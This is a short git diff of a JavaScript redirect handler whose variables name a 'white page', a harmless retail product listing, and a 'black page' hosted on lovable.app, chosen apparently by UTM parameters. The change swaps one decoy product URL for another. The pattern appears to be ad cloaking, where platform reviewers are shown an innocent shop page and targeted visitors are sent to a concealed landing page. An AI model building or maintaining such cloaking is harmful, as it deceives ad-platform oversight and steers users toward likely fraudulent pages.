@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://runawaythelabel.com/products/camila-knit-pant-ochre";
+    const whitePageURL = "https://www.ubuy.com.sa/en/product/4LMRTPGG4-aboosam-baby-toys-6-to-12-months-musical-learning-infant-toys-12-18-months-babies-ocean-rotating-light-up-toys-for-toddlers-1-2-3-years-old-boys?srsltid=AfmBOop6D-r9YIc9g4OEpu-JPqGFtPpiEs8cRrD7shgAybkIZD27Dre0";
     const blackPageURL = "https://luvcshap.lovable.app/?";
   
     // Parse the UTM parameters from the request URL
@@ -26,6 +26,7 @@ export default function handler(req, res) {
     res.end();
 
   }
+
 
 
 
